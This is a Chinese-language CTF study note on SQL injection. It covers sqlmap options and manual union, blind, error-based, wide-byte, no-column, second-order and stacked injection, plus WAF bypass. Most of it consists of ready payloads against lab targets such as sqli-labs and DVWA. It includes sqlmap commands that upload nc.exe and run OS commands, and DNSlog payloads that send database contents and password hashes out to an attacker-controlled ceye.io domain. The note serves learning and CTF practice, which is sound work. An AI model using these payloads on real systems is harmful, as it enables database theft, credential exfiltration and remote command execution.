---
title: SQL注入&CTF例题
date: 2021-09-06 17:17:22
tags:  CTF
category: CTF
---

# 介绍与原理📖

## TIPS

1. 爆不出来结果试试十六进制编码的名字【from不可，where可】，库名也可以用函数database()代替【[参考](https://saucer-man.com/information_security/101.html)】

   - 十六进制：**sql语句能用16进制地方的最好用16进制，因为单引号双引号可能造成一些错误**
   - 不可16进制编码的地方：sql关键字：如from、select、from后的名字也不行
   - 可16进制的：where条件的字段、函数参数

2. 盲注and or 失败后试宽字节注入`%df%27 union select 1,2%23`  【**报错即注入成功**】

3. 流程：

   **一般手工注入的姿势为：判断时什么注入，有无过滤关键词 --> 获取数据库用户、版本、当前数据库 --> 获取数据库的某个表 --> 获取字段 --> 获取数据**

4. 几个常用函数：

   1. version()——MySQL版本
   2. user()——用户名
   3. database()——数据库名
   4. @@datadir——数据库路径
   5. @@version_compile_os——操作系统版本

5. 这里一般要用到连接函数

   1. concat(str1,str2,...)直接连接字符串，没有分隔符
   2. concat_ws(separator, str1, str2,...)连接字符串，中间用separator分割
   3. group_concat()用来连接多行的值，用逗号分割

6. <span style="background:#FF9999;">注意！</span>不同的参数不一定都能注入，理论上都可以，但是有的是数字有的是字符注意区分不同的注入语法！

7. burpsuite GET后面的参数注入时注意把空格变成`+`，否则认为是隔开符

![](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439842.png)



## sqlmap

[简书常用命令大全](https://www.jianshu.com/p/fa77f2ed788b)
[freebuf sqlmap总结，大全，【很多】](https://m.freebuf.com/sectool/164608.html)

[**乌云 sqlmap手册](https://wooyun.kieran.top/#!/drops/25.sqlmap%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C)

[思维导图的博客+命令](https://www.cnblogs.com/bmjoker/p/9326258.html)

![2](https://img-blog.csdnimg.cn/20190311094049471.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70)



### 技巧点

1. 要登陆的，登陆后生成cookie，sqlmap时要加上
  ```
sqlmap -u "http://127.0.0.1:8000/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=j1ro8g2ei0vcug3k37arohdd44; security=low" --batch
  ```

2. 对post请求表单式注入，可用两种方法
  - 使用burpsuite抓包，将数据包内容复制下来保存在文本中，然后使用SQLMap -r进行post注入

```
sqlmap -r \Desktop\xxx.txt --batch
```
- 直接用--data "表单参数【form data】"或--forms自动解析表单
```
sqlmap.py -u "http://127.0.0.1:8000/vulnerabilities/sqli/" --cookie="PHPSESSID=j1ro8g2ei0vcug3k37arohdd44; security=medium" --data "id=1&Submit=Submit"
```
3. 针对dvwa高安全级别下，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转的[wp ](https://www.jianshu.com/p/e263ea40fe25)
- 用`--second-order="xxxurl"`
- 使用于查询数据提交、结果显示分别在2各个不同的页面中
```
sqlmap --url="http://localhost:8001/dvwa/vulnerabilities/sqli/session-input.php" --data="id=1&Submit=Submit" --second-order="http://localhost:8001/dvwa/vulnerabilities/sqli/" --cookie="security=high; PHPSESSID=g5mep9dj1vmkjiha8qnpfpn2i7" --batch
```
 - 也可以保存文件后用第二种方法再--second
 - 这时sqli.txt文件中对应是查询数据提交时的POST数据包的内容，其中已经包含有cookie信息、以及POST请求体中的Form data数据，**所以命令中不需要单独在写**

4. 针对查询特定库/表/字段报错的=》编码绕过
> 爆表名:
> ?id=1%df%27 union select 1,2,table_name from information_schema.tables where table_schema=mydbs%23
> 发现报错。。。可能有过滤
> 那么把mydbs转成16进制:0x6d79646273 (..字符转16进制即可，要转对，有个网址16进制换是转错的。。浪费我好多时间)
> ?id=1%df%27 union select 1,2,table_name from information_schema.tables where table_schema=0x6d79646273%23

5. 设置具体sql注入技术

   --technique B 布尔盲注

   --technique E 报错注入

   --technique U union查询注入

   --technique S 堆叠注入

   --technique T 时间盲注

   --technique Q 内联查询注入

   ```
   sqlmap -u http://192.168.1.121/sqli/Less-1/?id=1 --technique T --time-sec 3 --dbs 
   //--time -sec 时间盲注时间为3
   ```

   

6.  **使用Sqlmap进行Cookie注入**
   
      在SQLmap中有一个参数“--Level”,==当“leavel>=2”时就会检测COOKIE后面的参数，当“level>3”时将会检测User-Agent和Referer==,这为COOKIE的注入提供了便利：
   
      ```
      sqlmap -u  http://xxx.xx.xx.xx:xx/test.php  --cookie id=1 --dbs --leavel 2
      ```
   
      

7. 只有root才能读写文件，load_file

7. 如果你想看到sqlmap发送的测试payload最好的等级就是3。

9. 避免过多的错误请求被屏蔽，可用参数

```
1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
```

10. 指定参数：-p

    **sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p "id,user-anget"**

    

11. 在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*

```
python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"
sqlmap将会测试value1的位置是否可注入。
```

12. --prefix：前缀和--suffix：后缀

    需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。

    ```
    python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
    
    $query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1"; 
    这样执行的SQL语句变成：
    $query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1"; 
    ```

13. --level:探测等级

    5个等级，默认是1

    **sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。**

    HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。

    总之在你**不确定哪个payload或者参数为注入点的时候**，为了保证全面性，建议使用高的level值

14. --risk 风险等级

    共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。

    为什么叫风险，**例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。**

15. 还可以爆破数据库用户明文密码**--passwords**

16. 暴力破解

    **--common-tables**：暴力破解表名

    ```
    适用环境：
    当使用--tables无法获取到数据库的表时，可以使用此参数
    1.MySQL数据库版本小于5.0，没有information_schema表。
    2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
    3、当前用户没有权限读取系统中保存数据结构的表的权限。
    ```

**--common-columns**：暴力破解列名

17. 读文件：

    --file-read "C:/example.txt"

    ```
    前提:有权限、数据库为MySQL，PostgreSQL或Microsoft SQL Server
    ```

18.上传文件

​	--file-write,--file-dest，前提：当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。

```
python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1
```

19. 运行操作系统命令

    **--os-cmd**

    --os-shell ：也可以模拟一个真实的shell，可以输入你想执行的命令

    ```
    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
    --os-cmd id
    ```

20. sqlmap还可以和msf联动，

    

21. 权限问题：

    ```
    默认情况下MySQL在Windows上以SYSTEM权限运行，PostgreSQL在Windows与Linux中是低权限运行，Microsoft SQL Server 2000默认是以SYSTEM权限运行，Microsoft SQL Server 2005与2008大部分是以NETWORK SERVICE有时是LOCAL SERVICE。
    ```

    









## 手注

[简书，sql一些函数总结，精简结合实例易理解](https://www.jianshu.com/p/fcc5d8e69d68)

[简书手注初级保姆级流程**](https://www.jianshu.com/p/54b630f1ec35)

1. 探测字段数：用1，2，3测，或order by2（测是不是两个字段）/3（测三个）
2. Mysql安装后默认会创建三个数据库：information_schema、mysql和test


###利用information库手注
3. 获取当前数据库用户【假设字段为2】
```
1' union select user(),2 #
```
4. 获取所有数据库名称【information_schema库下的schemata表中保存着DBMS中的所有数据库名称信息】
```
1' union select 1,schema_name from information_schema.schemata #
```

5. 获取当前数据库下**所有表名**
```
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
```
6. 获取表中所有列名
```
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
```
7. 导出具体数据
- 一次性获取users表中**所有行的**user和password数据，用符合'--'连接每一组中user和password，每一组"user--password"又分别用逗号隔开，集中在一起输出结果
```
1' union select 1,group_concat(concat_ws('--',user,password)) from users #
```
- 或者分别获取每一行数据
```
1' union select 1,concat_ws('--',user,password) from users #
```

### 注入类型
sqlmap 支持5种漏洞检测类型:

- 基于布尔的盲注检测  (如果一个url的地址为xxxx.php?id=1,那么我们可以尝试下的加上 and 1=1(和没加and1=1结果保持一致) 和 and 1=2(和不加and1=2结果不一致),则我们基本可以确定是存在布尔注入的. )
- 基于时间的盲注检测(和基于布尔的检测有些类似.通过mysql的 sleep(int)) 来观察浏览器的响应是否等待了你设定的那个值 如果等待了,则表示执行了sleep,则基本确定是存在sql注入的
- 基于错误的检测 (组合查询语句,看是否报错(在服务器没有抑制报错信息的前提下),==如果报错 则证明我们组合的查询语句特定的字符被应用了==,如果不报错,则我们输入的特殊字符很可能被服务器给过滤掉(也可能是抑制了错误输出.))
- 基于union联合查询的检测(适用于如果某个web项目对查询结果只展示一条而我们需要多条的时候 则使用union联合查询搭配concat还进行获取更多的信息)
-  基于堆叠查询的检测(首先看服务器支不支持多语句查询,一般服务器sql语句都是写死的,某些特定的地方用占位符来接受用户输入的变量,这样即使我们加and 也只能执行select(也不一定select,主要看应用场景,总之就是服务端写了什么,你就能执行什么)查询语句,如果能插入分号;则我们后面可以自己组合update,insert,delete等语句来进行进一步操作)


### 数字型注入和字符型注入
[简书，精简**](https://www.jianshu.com/p/5edd7a58a69e)

1. 一个参数是int，一个是string
2. 输入`1 and 1=2`，报错即为数字型注入【执行and逻辑判断】，否则为字符型注入（字符串内的`1 and 1=2`不执行and逻辑判断），要去利用单引号闭合来注入
3. 数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的

### 搜索注入
[个人博客，精简](https://www.codenong.com/cs106446931/)
类似字符型注入，不过参数处变成`'%xxx%'`  ，注意要绕过%
- 几种绕过方法：
```
'and 1=1 and '%'='

%' and 1=1--'

%' and 1=1 and '%'='
```
eg:
```
例如我们在搜索框输入 李%‘and’1’=‘1’ and%’=’
SELECT * from table where users like’%李%‘and’1’=‘1’and’%’=’%’
```
- 剩余爆库手段大体等于字符注入


### 布尔盲注
[简单，简书手工布尔盲注](http://127.0.0.1/sqli-labs/Less-8/?id=1‘)

小例子：
- 查询字段名中包含 username 的表
```
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```
- 查表名
```
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
```

1. 通过构造sql语句，通过判断语句是否**执行成功**来对数据进行猜解。【无回显，只返回对错】
2. **只返回true/false，不返回报错**【返回报错则说明有union注入】
3. 例如:

  	先判断当前数据库的长度
  `http://127.0.0.1/sqli-labs/Less-8/?id=1' and length(database())>8 --+`
发现说明等级8的时候，页面就没有显示。那么说明database（）的长度是8

4. 常用函数及注入技巧

```
#left (a, b)从左侧截取a的前b位 ❗注意是前几位，不是第几位
left (database(),1)

ord=ascii 
ascii(x)=97 判断x的ascii码是否等于97
```

🔴<span style="background:#FF9999;">注意：mid第二个参数从1开始,</span>

🟠<span style="background:#FFFFBB;">limit第一个参数从0开始</span>



![](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041459346.jpeg)



### 报错注入

[***个人博客王叹之总结，宝典](https://www.cnblogs.com/wangtanzhi/p/12577891.html)

[简书 12种报错注入+万能语句，简洁](https://www.jianshu.com/p/bc35f8dd4f7c)

#### pow()溢出报错注入

- 要点：查询正确会因为pow溢出而报错，否则不报错只是说查询不到=》查询出错，类似布尔注入

```mysql
select 1 and case1 and pow(999,999)发生报错，说明case1为真
select 1 and case2 and pow(999,999)没报错，只是查询不到，说明case2为假
case可以作为我们用来判断的语句，进行布尔盲注
```



- <img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439843.png" alt="image-20210522142152524" style="zoom:67%;" />

#### join..using

1. 用法：MySQL 的 JOIN 在两个或多个表中查询数据。【[菜鸟教程](https://www.runoob.com/mysql/mysql-join.html)、[csdn例子加教程](https://blog.csdn.net/weixin_46706771/article/details/112769113)】
2. 有重复的列名时报错并返回一个重复的列名
3. **就是利用join使得mysql列名重复，报错返回重复的列名得到我们想要的信息**

> 通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。
>
> 并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件【排去重复的列名最后得到全部列名信息】来避免报错

![join](https://img2020.cnblogs.com/blog/1625650/202003/1625650-20200329143159098-1312087130.png)





#### extractvalue()、updatexml()

[大佬csdn](https://blog.csdn.net/zpy1998zpy/article/details/80631036)    、 [阿里云](https://developer.aliyun.com/article/692723)、、[详解](https://my.oschina.net/u/4610683/blog/4492284) 、[王叹之也有](https://www.cnblogs.com/wangtanzhi/p/12577891.html)

```
extractvalue() :对XML文档进行查询的函数
语法：extractvalue(目标xml文档，xml路径)

第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错

select username from security.user where and (extractvalue(‘anything’,concat(‘/’,(select database()))))
这里在’anything’中查询 位置是 /database()的内容，

但是：
select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))
**可以看出，以~开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么**，这样就达到了目的。当然concat第一个参数是/时**不会报错**
```



```mysql
updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

updatexml()函数与extractvalue()类似，是更新xml文档的函数。

语法updatexml(目标xml文档，xml路径，更新的内容)

select username from security.user where id=1 and (updatexml(‘anything’,’/xx/xx’,’anything’))

通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后回显报错。

错误大概会是：
ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’   //则爆出信息
```

注意：

- updatexml是三个参数，中间参数配合concat注入，concat一三参数标识回显结果的头和尾，`0x7e`是`~`
- extractvalue两个参数，第二个参数配合concat
- **extractvalue()和updatexml()**只能回显==32位长度==的数据
- <span style="background:#bbffff;"> select，insert，update没有回显的都可以使用</span>



爆出所有表名

```mysql
http://www.anantest.com:8080/sqlilabs/Less-3/
?id=1') and updatexml(1,concat(0x23,(select group_concat(schema_name) from information_schema.schemata )),1)-

//爆表名:
or extractvalue(1, concat(0x7e, (select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))
爆字段名:
or extractvalue(1, concat(0x7e, (select concat(column_name) from information_schema.columns where table_name='users' limit 0,1)))
爆数据:
or extractvalue(1, concat(0x7e, (select concat_ws(':', username, password) from users limit 0,1))) or ''
```





#### [ **floor**](https://www.cnblogs.com/c1047509362/p/12806297.html)





### 时间盲注

> 用工具、脚本

1. 与布尔盲注类似，但是无法通过返回信息判断对错，因为只返回true。可通过时间函数sleep，**<span style="background:#BBFFBB;">通过web页面响应时间判断注入语句是否成功</span>**
2. 用`if`和`sleep`函数判断是ture还是false
<u>正确就延迟n秒返回，错误就0s返回</u>

```
if类似三目运算
if(条件,expr2,expr3)，如果条件为true,则返回expr2的值，否则返回3
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439844.png" alt="image-20210726204326926" style="zoom:67%;" />

<span style="background:#bbffff;">sleep可以放在if的第二个参数，也可以是if放在sleep里</span>

```
select * from member where id=1 and sleep (if (database ()='a',1,0));
如果database是a则停1s否则不停
id=2 and  sleep( if(  (SELECT count(SCHEMA_NAME) FROM information_schema.SCHEMATA) = 7,    0,5 ))
好像这个是说如果数据库总数等于7的话0s返回否则5s
```
3. 其他操作如获取库名、表名、爆破子段等等同布尔注入，只是通过sleep函数查看是否成功




### 宽子节注入
- [**精简，CSDN 原理及防御](https://blog.csdn.net/u011721501/article/details/42874517)
- [少，易理解，简书](https://www.jianshu.com/p/7af00dcdd5d1)
- [***个人博客，内容点基础但面面俱到易理解](https://zgao.top/mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/)
- [跟前面差不多，都是很基础/常见的讲解，但配有例子，及sqlmap怎么宽子节注入](https://www.cnblogs.com/zhaoyixiang/p/10970117.html)


> 要点：
- 主要是绕过编码漏洞使单引号逃逸，让他闭合掉前面的查询，不被转义
- PHP编码为UTF-8而Mysql的编码设置为`set  names 'gbk'`或是`set character_set_client=gbk`，这样配置会引发编码转换从而导致的注入漏洞(**一个gbk编码汉字，占用2个字节，一个utf-8编码的汉字，占用3个字节**）
- 由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符（mysql判断一个字符是不是汉字，首先两个字符时一个汉字，另外根据gbk编码，**第一个字节ascii码大于128，基本上就可以了**），此时’前的\就被吃了，我们就可以使用’了，
- **只要报错就说明单引号逃逸，起了作用，留了一个单的引号，语法错误**
- **加了单引号不报错，说明单引号被转义或者被addslashes函数过滤掉了**

- 一般常见的宽字符注入
```
%df%27===>(addslashes)====>%df%5c%27====>(GBK)====>運’
用户输入==>过滤函数==>代码层的$sql==>mysql处理请求==>mysql中的sql
http://www.xxx.com/login.php?user=%df’ or 1=1 limit 1,1%23&pass=
其对应的sql就是：
select * fromcms_user where username = ‘運’ or 1=1 limit 1,1#’ and password=”
```


#### 套路
1. 试探是否有注入漏洞url里输入
`admin%df%27`
2. 爆列数`?id=1%df%27 order by 2# ` 
    列数得知 2列。
3. 爆库：
    `?id=-1%df%27 union select 1,database()%23`
    数据库:sae-chinalover
4. 爆列表:
```
?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572%23
```
  爆出这些表:
ctf,ctf2,ctf3,ctf4,gbksqli,news

5. 爆字段：
```
?id=-1%df%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23
```
字段:id flag
6. 查询关键字：
`?id=-1%df%27 union select 1,flag from ctf4%23`

7. 利用**sqlmap**
```
sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27"
```





### 无列名注入

[csdn](https://blog.csdn.net/qq_40500631/article/details/89631904)

1. 无列名注入主要是适用于**已经获取到数据表名**，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。
2. 通过对要查询的列起别名，并查询这个别名将数据查出，达到未知列名，依旧查询到信息的效果
3. 要点：==使用反引号`加数字表示**列名或者表名**，或者用别名表示【反引号被过滤时】【**a.3**】==
4. ==[也可以使用join报错进行无列名注入](https://www.cnblogs.com/GH-D/p/11962522.html)==



![image-20210522141728684](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439845.png)

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439846.png" alt="image-20210522134617792" style="zoom:50%;" />

```mysql
//表有5列,列名为id,name,pass,mail,phone
select 1,2,3,4,5 union select*from users;   //列名变成12345，未知实际列名，前提是要知道表名 
//继续使用数字来对应列,如3对应了表里面的pass:
select`3`from (select 1,2,3,4,5 union select*from users)a;
//当`不能使用的时候，使用别名来代替：
select b from (select 1,2,3 as b,4,5 union select*from users)a;
//在注入中查询多个列：
select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select *from users)a limit 1,1;  //0x3a表示：
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439848.png" alt="image-20210522134817435"  />



#### 总结，一般套路：

别名法：

```mysql
(select `2` from (select 1,2,3 union select * from table_name)a)  //前提是要知道表名 
```

```mysql
((select c from (select 1,2,3 c union select * from users)b))    1，2，3是因为users表有三列，实际情况还需要猜测表的列的数量
```

```mysql
select a.3 from (select 1,2,3 union select * from users) as a;
```

join法：

```mysql
select * from (select * from users as a join users b)c;  //爆列名
ERROR 1060(42S21):Duplicate column name 'username'  //得到列名username
```



```
-1' union select 1, (select group_concat(a) from(select 1 as s,2 as a,3 as b union select * from users)as m),3,4,5,6'
//一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件，把users中第一列别名s,第二列别名a，第三列别名b，查询得到新的表别名m，供给外部查询a列
```



## 🐱‍🏍注入拓展

#### 加解密

> sqlilabs 21关

关键点：注入的语句加密后发送

- 关联sqlmap：
  - 配合参数tamper，自带插件，使用外部.py文件实现例如base64注入点
  - 也可以不用插件自己写脚本配合sqlmap【<span style="background:#FF9999;">中转注入</span>】
    - ![image-20210727204045560](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439849.png)
    - 然后`sqlmap -u "http://127.0.0.1:8080/test.php?x=" -v 3`，  `-v 3`是sqlmap显示注入语句

#### JSON注入

#### LADP注入

#### DNSlog注入

> sqlilabs 9  load_file+dnslog带外注入

> http://ceye.io/profile【免费的记录dnslog的平台】
>
> https://github.com/ADOOO/DnslogSqlinj【win下】
>
> http://www.dnslog.cn
>
> http://admin.dnslog.link/

> [个人博客详解1](https://www.cnblogs.com/-qing-/p/10623583.html)、[*3](https://www.cnblogs.com/xhds/p/12322839.html)、[**freebuf](https://www.freebuf.com/sectool/280777.html)

1. 用户得是root，有读写文件的权限
2. 解决了盲注还不能*回显数据*，效率低的问题,**另外要发送大量的get请求，那么这种行为很容易被目标物理防火墙认定位是黑客行为，最终导致IP被ban。而DNS不会**

- 原理
  - DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息
    **简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息**
  - 原理上只要能进行DNS请求的函数都可能存在DNSlog注入。
- 应用条件
  - <span style="background:#FF9999;">windows下</span>Mysql【因为Linux没有UNC路径，所以当处于Linux系统时，不能使用该方式获取数据】
  - 返回数据没有特殊符号
  - **load_file函数，【<span style="background:#FF9999;">所以一般得是root权限</span>】，**load_file()不仅能够加载本地文件，同时也能对诸如www.test.com这样的URL发起请求。
- 应用场景

  - SQL注入中的盲注
    在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易**被waf拦截**，又或者是目标站点**没有回显**
  - 无回显的命令执行
    我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功
  - 无回显的SSRF
  - **<span style="background:#FF9999;">总之就是靶机不让信息显示出来，如果靶机能发送请求，那么就可以尝试咱这个办法——用DNSlog来获取回显</span>**



- [load_file](https://www.xcnte.com/archives/512/)--**读取一个文件并将其内容作为字符串返回。**

  - **必须指定文件==完整的路径==**

  - ```
    SELECT LOAD_FILE('/data/test.txt') AS Result; //返回test文件内容
    ```
  
  - 参数可以是`char()`或者十六进制`hex()`的形式
  
  

普通回显win：

```
ping %USERNAME%.j1wbye.ceye.io
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439850.png" alt="image-20210728162212024" style="zoom: 67%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439851.png" alt="image-20210728162224771" style="zoom:67%;" />

SQL注入：


```mysql
load_file(concat('\\\\',(select database()),'.abcdef.ceye.io\\sql')) //重点
所以就等同于访问了database().abcdef.ceye.io，然后我们的ceye平台就会有记录，那么database()就得到了，\\sql是域名目录，随意即可，select database()换成sql注入payload即可

  要注意的是数据很可能不止一行，因此要用limit分次输出。
  
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc')); 【limit后加1个数字：前几行】
  
1. 查询数据库名
http://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\',(select database()),'.cmr1ua.ceye.io\\abc'))--+

2. 获取数据表
http://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.cmr1ua.ceye.io\\abc'))--+

3. 获取表中的字段名
' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.cmr1ua.ceye.io\\abc'))--+

4. 获取表中字段下的数据
' and load_file(concat('\\\\',(select password from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
' and load_file(concat('\\\\',(select username from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+

//注意！⚠
//因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 
出来了再转回去
' and load_file(concat('\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
```



[Sqlmap支持dns回显注入](https://www.freebuf.com/column/226091.html)

​	在sqlmap中实现DNS注入加上参数

​	在服务器安装好了sqlmap然后运行dns.py

```
	--dns-domain=域名
python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-2/?id=1" --tech B --dns-domain 192.168.0.18 --dbs
```

​	即可实现自动化



#### 二次注入

<span style="background:#FF9999;">前端找不到，**扫描工具也无效！** **只能靠人工**</span>

> sqlilab 登录框+24关

> [**CSDN简洁版](https://blog.csdn.net/weixin_44262289/article/details/107699595?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.control&spm=1001.2101.3001.4242)
>
> [freebuf科普加例题+强网杯](https://www.freebuf.com/articles/web/167089.html)
>
> CTF-[网鼎杯2018]Unfinish【buu/cuthub】

注册用户：插入数据，修改密码：更新数据

先注册用户，对用户名做马脚然后修改密码时实现对其他账号的注入

- 关键点：插入危险数据=》显示危险数据

- **核心原理：**

**提前把危险语句插入数据库（插入），数据在存入数据库后还原成了用户输入的形式，当在数据库取出的时候（更新/查询），没有再次进行过滤和转义，执行语句导致错误，从而造成了二次注入。**



Q:二次注入可能存在在什么地方

- 存在转义函数的地方
- 在<span style="background:#bbffff;">回溯数据输入的地方，如修改用户账户密码、修改文章标题</span>
- 跨语言的应用，容易导致问题。比如前台PHP，后台java
- 日志相关：存日志时，读取了一些数据库里的信息，比如用户名等，然后又存储了一次
- 跨程序的数据传递：程序A处理完后存储到数据库，程序B去读取，未进行过滤





- **二次注入漏洞挖掘思路有哪些**

（1）数据库存储未转义，大多来说，存储到数据库中的东西只是做了表面的转义，实质上库里存储的还是原始状态的内容，在多数读取未校验的情况下，可输入特殊字符并在页面上完整显示的部分，有可能存在二次注入的可能。

（2）强交互部分，SQL注入是需要与数据库联动的，但往往在登录、修改内容、发布内容等功能上忽略了历史数据这一点，所以在遇到有修改账户密码、发布留言、发布内容的部分，大家不妨去试试注册一个test或者admin’--或者admin账号，然后在测试回复的内容或者修改的内容是否达到预期。如果与预期不符，那么有可能就存在二次注入，此时在精心构造sql语句即可。

（3）防御绕过，有些地方明显存在异常，但是又做了一些限制，比如年龄，限制了字段为is_numeric，那么我们可以通过转换进制，16进制等方式将其录入，查询时的效果是一样的，遇到其他的限制，跟xss绕过原理一样，大家可以脑洞大开，搞一些数据库可以解析的编码进去。

（4）多录入异常内容，多观察返回结果，凡是与自己录入的内容不一致的地方，就可以去看看是否存在二次注入。

**黑盒测试**：观察能获得哪些信息，可以添加哪些信息，哪些信息可以修改，还可盲猜列名实现不同地方update时回显注入语句



- <span style="background:#FF9999;">注意！</span>
  - is_numeric可以用16进制编码`hex()`绕过。



```
当访问username=test’&password=123时，执行的SQL语句为： 
insert into users(username,password) values ( ‘ test\ ’ ',‘202cb962ac59075b964b07152d234b70’)数据库中就变成了
test'  123
查询对应id时
Select * from person where ‘username’=‘test’’ //发生注入，由于多了一个单引号，所以页面会报错。
```





#### 堆叠注入

> sqlilab天书 38关

​	含义：多个sql语句以；放在一起

​	数据库分号；代表语句结束=》按顺序进行

我们是用mysql_query()接收的sql语句。而mysql_query()它本身只能执行一句sql语句，所以就会出错。把mysql_query()换为mysqli_multi_query()就可以执行多条sql语句查询。但mysqli_multi_query()的返回类型为布尔型。

​	并不是所有数据库都支持堆叠查询：<span style="background:#bbffff;">支持堆叠数据库类型：MYSQL MSSQL Postgresql等</span>



- 用处

  //注入需要管理员帐号密码，密码是加密，无法解密
  //堆叠注入进行插入数据，用户密码自定义的，可以正常解密登录【自己添加一个管理员账号密码】

- 注意⚠
  - **堆叠注入需要条件**，在源代码关于sql是可以多条语句执行情况下可以堆叠注入，否则不行，不会执行SQL语句，会报错
  - 

### 🛡WAF绕过

> Sqlilabs-Less38-堆叠注入(多语句)

> ***[WAF Bypass数据库特性](https://www.secpulse.com/archives/94962.html)

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439852.png" alt="image-20210808104332262" style="zoom:67%;" />



> waf软件：阿里云盾，宝塔，安全狗

- %0a 是换行符，%23 是#

#### 参数污染

​	有多个参数，以哪个参数为准

​	服务器处理参数：

![image-20210808165140675](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439853.png)

```
例如apache：
?y=1&y=2
GET最后y是2
```



参数污染+特殊符号注释

```
id=-1/**&id=-1%20union%20select%201,2,3%23*/
即id=-1 union select 1,2,3#*/
```

